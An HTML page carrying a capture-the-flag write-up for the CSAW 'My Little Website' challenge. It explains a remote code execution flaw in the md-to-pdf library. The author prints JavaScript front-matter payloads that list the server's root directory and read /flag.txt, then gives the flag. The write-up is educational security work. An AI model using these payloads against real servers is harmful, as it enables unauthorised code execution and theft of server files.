<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><title>My Little Website</title><link href=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css rel=stylesheet integrity=sha384-gH2yIJqKdNHPEq0n4Mqa/HGKIhSkIHeL5AyhkYV8i59U5AR6csBvApHHNl/vI1Bx crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js integrity=sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa crossorigin=anonymous></script>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Inconsolata&family=Poppins&display=swap" rel=stylesheet></head><body><style>.nav_shadow{box-shadow:0 0 14px rgba(0,0,0,.5);-webkit-box-shadow:0 0 14px 0 rgba(0,0,0,.5)}.navbar-custom{background-color:#333c33;font-size:16pt}.navbar-custom *{color:#fff;font-family:poppins,sans-serif}</style><nav class="navbar navbar-expand-lg navbar-dark nav_shadow navbar-custom"><div class=container><div class=container-fluid><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<span class=navbar-toggler-icon></span></button><div class="collapse navbar-collapse" id=navbarSupportedContent><ul class="navbar-nav me-auto mb-2 mb-lg-0"><li class=nav-item><a class=nav-link href=/><strong>Home</strong></a></li><li class=nav-item><a class=nav-link href=/about/><strong>About</strong></a></li><li class=nav-item><a class=nav-link href=/roster/><strong>Roster</strong></a></li><li class=nav-item><a class=nav-link href=/writeups/><strong>Writeups</strong></a></li></ul></div></div></div></nav><br><div id=content><div class=container><h1>My Little Website</h1><span>By CDT Daniel Chung
<span><br><hr class="hr hr-blurry"><p>Let&rsquo;s say, hypothetically, that you made a program without user sanization&mldr;</p><h2 id=description>Description</h2><p>I am new to programming and made this simple pdf creater website here, hopefully it is secure enough :)&mldr;</p><p><a href=http://web.chal.csaw.io:5013/>http://web.chal.csaw.io:5013/</a></p><h3 id=tldr>TL;DR</h3><p>Server is powered by express and was using <code>md-to-pdf</code> for converting markdown to pdfs. A vulnerability exists for RCE within <code>md-to-pdf</code>, exploit and get flag.</p><h3 id=first-look>First Look</h3><p>The first thing I did was fire off a Nikto scan, which shows that the server is powered by express. We now know that the backend is <code>nodejs</code>.</p><h3 id=correct-path>Correct Path</h3><p>Thankfully, no rabbit holes here. An extremely educated guess had me thinking that the server was using <code>md-to-pdf</code> to convert markdown into a pdf. <a href="https://www.google.com/search?channel=fs&client=ubuntu&q=markdown+to+pdf+exploit">Googling</a> if there was an exploit managed to get me to find <a href=https://github.com/simonhaenisch/md-to-pdf/issues/99>this</a> github issue, where <code>simonhaenisch</code> posted a possible exploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>---</span><span style=color:#a6e22e>js</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>css</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`body::before { content: &#34;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>).<span style=color:#a6e22e>readdirSync</span>(<span style=color:#e6db74>&#39;/&#39;</span>).<span style=color:#a6e22e>join</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;; display: block }`</span>,
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>---</span>
</span></span></code></pre></div><p>When testing this, I could see all the files in the application directory being output into the pdf. Changing the <code>readdirSync</code> to <code>readFileSync</code> as defined <a href=https://www.geeksforgeeks.org/node-js-fs-readfilesync-method/>here</a> allows the pdf to show the flag encoded in decimal, and using a decimal to ascii converter we get the flag.</p><h3 id=solve>Solve</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>---</span><span style=color:#a6e22e>js</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>css</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`body::before { content: &#34;</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>).<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;/flag.txt&#39;</span>).<span style=color:#a6e22e>join</span>()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;; display: block }`</span>,
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#f92672>---</span>
</span></span></code></pre></div><h3 id=flag>Flag</h3><pre tabindex=0><code>CTF{pdf_c0nt1nu3s_70_5uCK} 
</code></pre></div></div><footer class="footer mt-auto"><div class="container text-center text-muted"><p>Copyrights Â© 2022 BitsforEveryone. All rights reserved.</p><div class=social><a href=https://www.instagram.com/armywp_cyber/ class="fa fa-instagram"></a>
<a href=https://github.com/bitsforeveryone class="fa fa-github"></a></div></div></footer></body></html>